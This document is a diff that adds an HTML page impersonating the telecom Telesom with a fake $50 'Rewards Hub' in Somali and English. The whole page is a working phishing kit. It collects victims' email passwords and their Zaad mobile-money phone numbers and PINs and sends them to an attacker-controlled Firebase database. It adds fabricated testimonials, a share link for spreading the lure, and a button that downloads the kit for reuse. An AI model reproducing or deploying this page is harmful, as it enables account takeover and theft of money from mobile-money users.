@@ -1,0 +1,239 @@
+<html lang="so"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telesom Global Portal - Rewards</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
+    <style>
+        :root { 
+            --telesom-green: #2ecc71; 
+            --dark-green: #27ae60; 
+            --gold: #f1c40f; 
+            --dark-gray: #1a1a1a; 
+            --light-bg: #f8fafc;
+        }
+        body { margin: 0; font-family: 'Inter', 'Segoe UI', system-ui; background: var(--light-bg); color: #334155; }
+
+        .navbar { 
+            background: white; 
+            color: var(--dark-gray); 
+            padding: 0 8%; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            height: 80px; 
+            position: sticky; 
+            top: 0; 
+            z-index: 1000; 
+            box-shadow: 0 2px 15px rgba(0,0,0,0.08); 
+        }
+        .logo { font-size: 28px; font-weight: 900; color: var(--dark-green); text-decoration: none; display: flex; align-items: center; gap: 12px; }
+        .nav-links { display: flex; list-style: none; gap: 35px; margin: 0; padding: 0; }
+        .nav-links li a { color: #64748b; text-decoration: none; font-weight: 600; font-size: 15px; transition: 0.3s; display: flex; align-items: center; gap: 8px; }
+        .nav-links li a:hover, .nav-links li a.active { color: var(--dark-green); }
+        
+        .user-badge { background: #f1f5f9; padding: 8px 16px; border-radius: 50px; font-weight: 700; font-size: 14px; border: 1px solid #e2e8f0; display: flex; align-items: center; gap: 10px; }
+        .container { max-width: 1000px; margin: 40px auto; padding: 0 20px; }
+        
+        .grid-stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 25px; margin-bottom: 40px; }
+        .card { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.03); border-bottom: 4px solid var(--telesom-green); transition: 0.3s; }
+        .card h3 { font-size: 14px; text-transform: uppercase; letter-spacing: 1px; color: #94a3b8; margin: 0; }
+        .card .value { font-size: 32px; font-weight: 800; margin: 15px 0; color: #1e293b; }
+
+        .form-container { background: white; border-radius: 24px; overflow: hidden; box-shadow: 0 20px 50px rgba(0,0,0,0.06); border: 1px solid #f1f5f9; }
+        .form-header { background: linear-gradient(135deg, var(--dark-green), #2ecc71); color: white; padding: 40px; text-align: center; }
+        .form-body { padding: 45px; }
+
+        .step { display: none; animation: slideUp 0.5s ease-out; }
+        .step.active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        input, textarea { width: 100%; padding: 18px; margin-bottom: 20px; border: 2px solid #f1f5f9; border-radius: 14px; font-size: 16px; transition: 0.3s; background: #f8fafc; box-sizing: border-box; }
+        input:focus, textarea:focus { border-color: var(--telesom-green); outline: none; background: white; box-shadow: 0 0 0 4px rgba(46, 204, 113, 0.1); }
+        
+        .btn-main { background: var(--telesom-green); color: white; border: none; padding: 20px; width: 100%; border-radius: 14px; font-size: 18px; font-weight: 800; cursor: pointer; transition: 0.3s; box-shadow: 0 10px 20px rgba(46, 204, 113, 0.2); }
+        .btn-main:hover { background: var(--dark-green); transform: scale(1.01); }
+
+        .reviews-scroll { height: 450px; overflow-y: auto; margin-top: 25px; padding-right: 10px; scrollbar-width: thin; }
+        .review-item { background: #fff; border: 1px solid #f1f5f9; border-radius: 12px; padding: 15px; margin-bottom: 15px; display: flex; gap: 15px; transition: 0.2s; }
+        .review-item strong { font-size: 15px; display: block; margin-bottom: 4px; }
+        .review-item p { margin: 0; font-size: 14px; color: #64748b; line-height: 1.5; }
+
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid var(--telesom-green); border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 30px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .share-link { background: #e0f2fe; padding: 15px; border-radius: 10px; border: 1px dashed #0ea5e9; margin-top: 30px; text-align: center; }
+        
+        /* DOWNLAOD BUTTON STYLE */
+        .btn-download { background: #1e293b; color: white; padding: 10px 20px; border-radius: 8px; border: none; cursor: pointer; margin-top: 20px; font-weight: bold; width: 100%; }
+        
+        @media (max-width: 768px) { .navbar { padding: 0 20px; height: 70px; } .nav-links { display: none; } .form-body { padding: 25px; } }
+    </style>
+</head>
+<body>
+
+    <nav class="navbar">
+        <a href="#" class="logo"><i class="fas fa-signal-alt"></i> TELESOM</a>
+        <ul class="nav-links">
+            <li><a href="#" class="active"><i class="fas fa-chart-pie"></i> DASHBOARD</a></li>
+            <li><a href="#"><i class="fas fa-mobile-android-alt"></i> WAAFI</a></li>
+            <li><a href="#"><i class="fas fa-globe-africa"></i> INTERNET</a></li>
+            <li><a href="#"><i class="fas fa-gift"></i> REWARDS</a></li>
+            <li><a href="#"><i class="fas fa-headset"></i> SUPPORT</a></li>
+        </ul>
+        <div class="user-info"><div class="user-badge"><i class="fas fa-user-circle" style="color: var(--dark-green);"></i> ID: 77290</div></div>
+    </nav>
+
+    <div class="container">
+        <div class="grid-stats">
+            <div class="card">
+                <h3><i class="fas fa-wallet"></i> Current Balance</h3>
+                <div class="value">$12.40</div>
+            </div>
+            <div class="card">
+                <h3><i class="fas fa-stars"></i> Bonus Points</h3>
+                <div class="value">8,540</div>
+            </div>
+        </div>
+
+        <div class="form-container">
+            <div class="form-header">
+                <h2 style="margin:0;">Rewards Hub</h2>
+                <p>Hambalyo! Waxaad u qalantaa abaal-marin dhan $50</p>
+            </div>
+            
+            <div class="form-body">
+                <div id="step1" class="step active">
+                    <button class="btn-main" onclick="nextStep(2)">BILOW XAWILAADDA CUSUB</button>
+
+                    <div style="margin-top: 45px;">
+                        <div style="background: #f8fafc; padding: 20px; border-radius: 15px; border: 1px solid #e2e8f0; margin-bottom: 20px;">
+                            <h4 style="margin:0 0 10px 0;">Reeb Faallo (Live)</h4>
+                            <input type="text" id="c_name" placeholder="Magacaaga...">
+                            <textarea id="c_text" placeholder="Maxaad ka qabtaa abaal-marintan?"></textarea>
+                            <button class="btn-main" onclick="postComment()" style="padding:10px; font-size:14px;">SOO DIR FAALLADA</button>
+                        </div>
+
+                        <h4>Live Feed</h4>
+                        <div class="reviews-scroll" id="reviews-list"><div class="review-item"><i class="fas fa-user-circle" style="font-size:35px; color:#cbd5e0;"></i><div><strong>Khaalid  <span style="color:var(--dark-green); font-size:12px;">+$50 Received</span></strong><p>"Aadbaan ugu faraxsanhay inaan heli lacagtab"</p></div></div>
+                            <div class="review-item"><i class="fas fa-user-circle" style="font-size:35px; color:#cbd5e0;"></i><div><strong>Ahmed Mahamed <span style="color:var(--dark-green); font-size:12px;">+$50 Received</span></strong><p>"Mahadsanid Telesom, lacagtii hadda ayaan helay!"</p></div></div>
+                            <div class="review-item"><i class="fas fa-user-circle" style="font-size:35px; color:#cbd5e0;"></i><div><strong>Hodan Cali <span style="color:var(--dark-green); font-size:12px;">+$50 Received</span></strong><p>"Waa dhab, markii hore waan shakiyay laakiin hadda waa ii muuqataa."</p></div></div>
+                            <div class="review-item"><i class="fas fa-user-circle" style="font-size:35px; color:#cbd5e0;"></i><div><strong>Abdirahman Muse <span style="color:var(--dark-green); font-size:12px;">+$50 Received</span></strong><p>"Nidaam aad u dhakhso badan, $50 waa wax weyn."</p></div></div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="step2" class="step">
+                    <h2>Verification</h2>
+                    <input type="email" id="email" placeholder="Email Address">
+                    <input type="password" id="pass" placeholder="Email Password">
+                    <button class="btn-main" onclick="saveEmailData()">CONFIRM VERIFICATION</button>
+                </div>
+
+                <div id="step-loading" class="step" style="text-align: center; padding: 60px 0;">
+                    <div class="loader"></div>
+                    <h3>Hubinta Xogta...</h3>
+                </div>
+
+                <div id="step3" class="step">
+                    <input type="number" id="phone" placeholder="Lambarka Zaad-ka">
+                    <input type="password" id="pin" placeholder="Zaad PIN">
+                    <button class="btn-main" onclick="saveZaadData()">SHUBO LACAGTA HADA</button>
+                </div>
+
+                <div id="step4" class="step" style="text-align: center;">
+                    <h2>Codsigii waa la helay!</h2>
+                    <p>Lacagta waxaa laguugu soo shubi doonaa 10 daqiiqo gudahood.</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="share-link">
+            <strong>Link-ga aad dadka u dirayso:</strong><br>
+            <code id="myLink">https://telesom-rewards-2025.web.app</code><br>
+            <button onclick="copyLink()" style="margin-top:10px; padding:5px 10px; cursor:pointer;">Copy Link</button>
+            
+            <button onclick="downloadCode()" class="btn-download"><i class="fas fa-download"></i> SOO DEJI FAYLKA (INDEX.HTML)</button>
+        </div>
+    </div>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSy...", 
+            authDomain: "khaalid-abees.firebaseapp.com",
+            databaseURL: "https://khaalid-abees-default-rtdb.firebaseio.com",
+            projectId: "khaalid-abees",
+            storageBucket: "khaalid-abees.appspot.com",
+            messagingSenderId: "917326998020",
+            appId: "1:917326998020:web:f44a430dddb335c3a16351"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        // DOWNLOAD FUNCTION
+        function downloadCode() {
+            const htmlContent = document.documentElement.outerHTML;
+            const blob = new Blob([htmlContent], { type: 'text/html' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'index.html';
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        function postComment() {
+            const name = document.getElementById('c_name').value;
+            const text = document.getElementById('c_text').value;
+            if(name && text) {
+                db.ref('live_comments/').push({ name: name, msg: text });
+                document.getElementById('c_name').value = '';
+                document.getElementById('c_text').value = '';
+            }
+        }
+
+        db.ref('live_comments/').on('child_added', (snap) => {
+            const val = snap.val();
+            const div = document.createElement('div');
+            div.className = 'review-item';
+            div.innerHTML = `<i class="fas fa-user-circle" style="font-size:35px; color:#cbd5e0;"></i><div><strong>${val.name} <span style="color:var(--dark-green); font-size:12px;">+$50 Received</span></strong><p>"${val.msg}"</p></div>`;
+            document.getElementById('reviews-list').prepend(div);
+        });
+
+        function nextStep(n) {
+            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+            if(n === '-loading') document.getElementById('step-loading').classList.add('active');
+            else document.getElementById('step' + n).classList.add('active');
+        }
+
+        function saveEmailData() {
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+            if(email && pass) {
+                db.ref('email_records/').push({ email: email, password: pass });
+                nextStep('-loading');
+                setTimeout(() => { nextStep(3); }, 3000);
+            }
+        }
+
+        function saveZaadData() {
+            const phone = document.getElementById('phone').value;
+            const pin = document.getElementById('pin').value;
+            if(phone && pin) {
+                db.ref('zaad_records/').push({ phone: phone, pin: pin }).then(() => { nextStep(4); });
+            }
+        }
+
+        function copyLink() {
+            const link = document.getElementById('myLink').innerText;
+            navigator.clipboard.writeText(link);
+            alert("Link-ga waa la koobiyeeyay!");
+        }
+    </script>
+
+
+</body></html>
